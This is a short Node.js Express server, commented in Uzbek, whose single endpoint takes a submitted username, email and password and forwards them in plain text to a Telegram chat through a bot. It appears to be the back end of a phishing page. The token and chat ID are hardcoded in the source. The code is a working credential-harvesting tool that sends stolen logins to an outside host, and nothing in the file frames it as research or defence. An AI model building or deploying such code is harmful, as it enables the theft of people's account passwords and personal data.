const express = require('express');
const bodyParser = require('body-parser');
const { Telegraf } = require('telegraf');

const app = express();
const port = 3000;

// Telegram bot tokenini va chat ID-ni to'g'ridan-to'g'ri kiritish
const bot = new Telegraf('7863435786:AAH4IsY-QHQa9lWOMJRQ6Dn7JmgIpemVm5c');  // O'zingizning bot tokeningizni joylashtiring
const chatId = '7938269088';  // O'zingizning chat ID-ni joylashtiring

// Middleware
app.use(bodyParser.json());

// Login ma'lumotlarini olish uchun endpoint
app.post('/send-login-data', (req, res) => {
    const { username, email, password } = req.body;

    // Telegramga login va parolni yuborish
    const message = `Yangi foydalanuvchi login ma'lumotlari:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;

    // Botga yuborish
    bot.telegram.sendMessage(chatId, message)  // To'g'ridan-to'g'ri chat ID-ga yuborish
        .then(() => {
            res.json({ success: true });
        })
        .catch((error) => {
            console.error(error);
            res.json({ success: false });
        });
});

// Serverni ishga tushirish
app.listen(port, () => {
    console.log(`Server http://localhost:${port} manzilda ishlamoqda`);
});
